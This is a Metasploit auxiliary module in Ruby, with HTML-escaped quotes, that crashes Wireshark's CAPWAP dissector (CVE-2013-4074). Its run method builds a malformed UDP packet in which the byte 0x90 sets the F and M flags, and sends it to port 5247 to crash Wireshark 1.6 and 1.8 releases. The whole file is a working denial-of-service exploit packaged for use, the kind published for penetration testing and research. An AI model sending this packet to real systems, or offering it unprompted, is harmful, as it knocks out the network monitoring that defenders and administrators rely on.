# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Wireshark CAPWAP Dissector DoS&#039;,
      &#039;Description&#039;    => %q{
        This module inject a malicious udp packet to crash Wireshark 1.8.0 to 1.8.7 and 1.6.0
        to 1.6.15. The vulnerability exists in the capwap dissector which fails to handle an
        incomplete packet.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Laurent Butti&#039;, # Discovery vulnerability
          &#039;j0sm1&#039;  # Auxiliary msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-4074&#039;],
          [&#039;OSVDB&#039;, &#039;94091&#039;],
          [&#039;BID&#039;, &#039;60500&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 28 2014&#039;))
 
    # Protocol capwap needs port 5247 to trigger the dissector in wireshark
    register_options([ Opt::RPORT(5247) ], self.class)
  end
 
  def run
 
    connect_udp
 
    # We send a packet incomplete to crash dissector
    print_status("#{rhost}:#{rport} - Trying to crash wireshark capwap dissector ...")
    # With 0x90 in this location we set to 1 the flags F and M. The others flags are sets to 0, then
    # the dissector crash
    # You can see more information here: https://www.rfc-editor.org/rfc/rfc5415.txt
    # F = 1 ; L = 0 ; W = 0 ; M = 1 ; K = 0 ; Flags = 000
    buf = Rex::Text.rand_text(3) + "\x90" + Rex::Text.rand_text(15)
    udp_sock.put(buf)
 
    disconnect_udp
 
  end
end

